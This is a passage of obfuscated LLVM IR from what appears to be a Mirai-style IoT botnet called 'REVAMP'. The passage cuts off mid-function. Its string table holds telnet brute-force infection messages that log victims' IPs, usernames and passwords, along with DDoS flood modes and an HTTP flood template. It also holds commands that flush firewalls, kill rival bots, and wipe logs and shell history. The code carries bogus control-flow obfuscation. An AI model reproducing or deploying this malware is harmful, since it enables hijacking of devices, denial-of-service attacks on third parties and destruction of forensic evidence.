@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.473 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@MiraiIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.474 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.475 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.476 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.477 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.478 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.479 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.480 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.481 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.482 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.483 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.484 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.485 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.486 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.487 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.488 = private unnamed_addr constant [72 x i8] c"[ REVAMP ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.489 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.490 = private unnamed_addr constant [91 x i8] c"[ REVAMP ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.491 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.492 = private unnamed_addr constant [78 x i8] c"[ REVAMP ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.493 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.494 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.495 = private unnamed_addr constant [75 x i8] c"[ REVAMP ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.496 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.497 = private unnamed_addr constant [85 x i8] c"[ REVAMP ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.498 = private unnamed_addr constant [72 x i8] c"[ REVAMP ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.499 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@.str.500 = private unnamed_addr constant [11 x i8] c"d0mQacDMH0\00", align 1
@.str.501 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.502 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.503 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.504 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.505 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.506 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.507 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.508 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.509 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.511 = private unnamed_addr constant [5 x i8] c"SREP\00", align 1
@.str.512 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.513 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.514 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.515 = private unnamed_addr constant [21 x i8] c"[SREP] FLoad Mode ON\00", align 1
@.str.516 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.517 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.518 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.519 = private unnamed_addr constant [5 x i8] c"ZUDP\00", align 1
@.str.520 = private unnamed_addr constant [5 x i8] c"ZTCP\00", align 1
@.str.521 = private unnamed_addr constant [5 x i8] c"ZSTD\00", align 1
@.str.522 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.523 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.524 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.525 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.528 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.529 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.530 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.531 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.532 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.526 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.527 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.533 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.534 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.535 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.536 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.537 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart251, %1
  %11 = load i32, i32* @x.1
  %12 = load i32, i32* @y.2
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %3, align 4
  %20 = icmp slt i32 %19, 4096
  %21 = load i32, i32* @x.1
  %22 = load i32, i32* @y.2
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %82

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* @x.1
  %31 = load i32, i32* @y.2
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  %38 = load i32, i32* %3, align 4
  %39 = sub nsw i32 %38, 3
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  %42 = load i32, i32* %41, align 4
  %43 = load i32, i32* %3, align 4
  %44 = sub nsw i32 %43, 2
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  %47 = load i32, i32* %46, align 4
  %48 = xor i32 %42, %47
  %49 = xor i32 %48, -1640531527
  %50 = load i32, i32* %3, align 4
  %51 = xor i32 %49, %50
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  store i32 %51, i32* %54, align 4
  %55 = load i32, i32* @x.1
  %56 = load i32, i32* @y.2
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart244, label %originalBB1alteredBB

originalBBpart244:                                ; preds = %originalBB1
  br label %63

; <label>:63:                                     ; preds = %originalBBpart244
  %64 = load i32, i32* @x.1
  %65 = load i32, i32* @y.2
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %63
  %72 = load i32, i32* %3, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %3, align 4
  %74 = load i32, i32* @x.1
  %75 = load i32, i32* @y.2
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart251, label %originalBB46alteredBB

originalBBpart251:                                ; preds = %originalBB46
  br label %10

; <label>:82:                                     ; preds = %originalBBpart2
  %83 = load i32, i32* @x.1
  %84 = load i32, i32* @y.2
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %82
  %91 = load i32, i32* @x.1
  %92 = load i32, i32* @y.2
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %99 = load i32, i32* %3, align 4
  %100 = icmp slt i32 %99, 4096
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  %101 = load i32, i32* %3, align 4
  %_ = sub i32 %101, 3
  %gen = mul i32 %_, 3
  %_2 = sub i32 0, %101
  %gen3 = add i32 %_2, 3
  %_4 = shl i32 %101, 3
  %_5 = shl i32 %101, 3
  %_6 = sub i32 0, %101
  %gen7 = add i32 %_6, 3
  %_8 = shl i32 %101, 3
  %_9 = sub i32 0, %101
  %gen10 = add i32 %_9, 3
  %102 = sub nsw i32 %101, 3
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %103
  %105 = load i32, i32* %104, align 4
  %106 = load i32, i32* %3, align 4
  %_11 = sub i32 %106, 2
  %gen12 = mul i32 %_11, 2
  %_13 = sub i32 0, %106
  %gen14 = add i32 %_13, 2
  %_15 = shl i32 %106, 2
  %107 = sub nsw i32 %106, 2
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %108
  %110 = load i32, i32* %109, align 4
  %_16 = sub i32 %105, %110
  %gen17 = mul i32 %_16, %110
  %_18 = sub i32 %105, %110
  %gen19 = mul i32 %_18, %110
  %_20 = shl i32 %105, %110
  %_21 = sub i32 0, %105
  %gen22 = add i32 %_21, %110
  %_23 = shl i32 %105, %110
  %_24 = sub i32 0, %105
  %gen25 = add i32 %_24, %110
  %_26 = shl i32 %105, %110
  %111 = xor i32 %105, %110
  %_27 = sub i32 %111, -1640531527
  %gen28 = mul i32 %_27, -1640531527
  %_29 = shl i32 %111, -1640531527
  %_30 = sub i32 %111, -1640531527
  %gen31 = mul i32 %_30, -1640531527
  %_32 = sub i32 %111, -1640531527
  %gen33 = mul i32 %_32, -1640531527
  %_34 = sub i32 %111, -1640531527
  %gen35 = mul i32 %_34, -1640531527
  %112 = xor i32 %111, -1640531527
  %113 = load i32, i32* %3, align 4
  %_36 = shl i32 %112, %113
  %_37 = shl i32 %112, %113
  %_38 = shl i32 %112, %113
  %_39 = sub i32 0, %112
  %gen40 = add i32 %_39, %113
  %_41 = sub i32 0, %112
  %gen42 = add i32 %_41, %113
  %114 = xor i32 %112, %113
  %115 = load i32, i32* %3, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %116
  store i32 %114, i32* %117, align 4
  br label %originalBB1

originalBB46alteredBB:                            ; preds = %originalBB46, %63
  %118 = load i32, i32* %3, align 4
  %_47 = shl i32 %118, 1
  %_48 = sub i32 %118, 1
  %gen49 = mul i32 %_48, 1
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %3, align 4
  br label %originalBB46

originalBB53alteredBB:                            ; preds = %originalBB53, %82
  br label %originalBB53
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = load i32, i32* @x.5
  %4 = load i32, i32* @y.6
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8**, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8** %1, i8*** %13, align 8
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %16 = load i32, i32* @x.5
  %17 = load i32, i32* @y.6
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %originalBBpart213, %originalBBpart2
  %25 = load i32, i32* @x.5
  %26 = load i32, i32* @y.6
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = load i8**, i8*** %13, align 8
  %34 = load i32, i32* %14, align 4
  %35 = add nsw i32 %34, 1
  store i32 %35, i32* %14, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8*, i8** %33, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = icmp ne i8* %38, null
  %40 = load i32, i32* @x.5
  %41 = load i32, i32* @y.6
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart29, label %originalBB1alteredBB

originalBBpart29:                                 ; preds = %originalBB1
  br i1 %39, label %48, label %65

; <label>:48:                                     ; preds = %originalBBpart29
  %49 = load i32, i32* @x.5
  %50 = load i32, i32* @y.6
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %48
  %57 = load i32, i32* @x.5
  %58 = load i32, i32* @y.6
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br label %24

; <label>:65:                                     ; preds = %originalBBpart29
  store i32 0, i32* %15, align 4
  br label %66

; <label>:66:                                     ; preds = %97, %65
  %67 = load i32, i32* @x.5
  %68 = load i32, i32* @y.6
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %66
  %75 = load i32, i32* %15, align 4
  %76 = load i32, i32* %14, align 4
  %77 = icmp slt i32 %75, %76
  %78 = load i32, i32* @x.5
  %79 = load i32, i32* @y.6
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %77, label %86, label %100

; <label>:86:                                     ; preds = %originalBBpart217
  %87 = load i8*, i8** %12, align 8
  %88 = load i8**, i8*** %13, align 8
  %89 = load i32, i32* %15, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8*, i8** %88, i64 %90
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %87, i8* %92)
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %86
  store i32 1, i32* %11, align 4
  br label %101

; <label>:96:                                     ; preds = %86
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %15, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %15, align 4
  br label %66

; <label>:100:                                    ; preds = %originalBBpart217
  store i32 0, i32* %11, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* @x.5
  %103 = load i32, i32* @y.6
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %101
  %110 = load i32, i32* %11, align 4
  %111 = load i32, i32* @x.5
  %112 = load i32, i32* @y.6
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  ret i32 %110

originalBBalteredBB:                              ; preds = %originalBB, %2
  %119 = alloca i32, align 4
  %120 = alloca i8*, align 8
  %121 = alloca i8**, align 8
  %122 = alloca i32, align 4
  %123 = alloca i32, align 4
  store i8* %0, i8** %120, align 8
  store i8** %1, i8*** %121, align 8
  store i32 0, i32* %122, align 4
  store i32 0, i32* %123, align 4
  store i32 0, i32* %122, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  %124 = load i8**, i8*** %13, align 8
  %125 = load i32, i32* %14, align 4
  %_ = sub i32 0, %125
  %gen = add i32 %_, 1
  %_2 = shl i32 %125, 1
  %_3 = shl i32 %125, 1
  %_4 = sub i32 0, %125
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 %125, 1
  %gen7 = mul i32 %_6, 1
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %14, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8*, i8** %124, i64 %127
  %129 = load i8*, i8** %128, align 8
  %130 = icmp ne i8* %129, null
  br label %originalBB1

originalBB11alteredBB:                            ; preds = %originalBB11, %48
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %66
  %131 = load i32, i32* %15, align 4
  %132 = load i32, i32* %14, align 4
  %133 = icmp slt i32 %131, %132
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %101
  %134 = load i32, i32* %11, align 4
  br label %originalBB19
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = load i32, i32* @x.11
  %3 = load i32, i32* @y.12
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_success(i8* %11)
  %13 = icmp ne i32 %12, 0
  %14 = load i32, i32* @x.11
  %15 = load i32, i32* @y.12
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %26, label %22

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i8*, i8** %10, align 8
  %24 = call i32 @contains_fail(i8* %23)
  %25 = icmp ne i32 %24, 0
  br label %26

; <label>:26:                                     ; preds = %22, %originalBBpart2
  %27 = phi i1 [ true, %originalBBpart2 ], [ %25, %22 ]
  %28 = zext i1 %27 to i32
  ret i32 %28

originalBBalteredBB:                              ; preds = %originalBB, %1
  %29 = alloca i8*, align 8
  store i8* %0, i8** %29, align 8
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @contains_success(i8* %30)
  %32 = icmp ne i32 %31, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.13
  %6 = load i32, i32* @y.14
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %22, align 8
  %23 = load i32, i32* %15, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %24, i64* %25, align 8
  %26 = load i32, i32* @x.13
  %27 = load i32, i32* @y.14
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
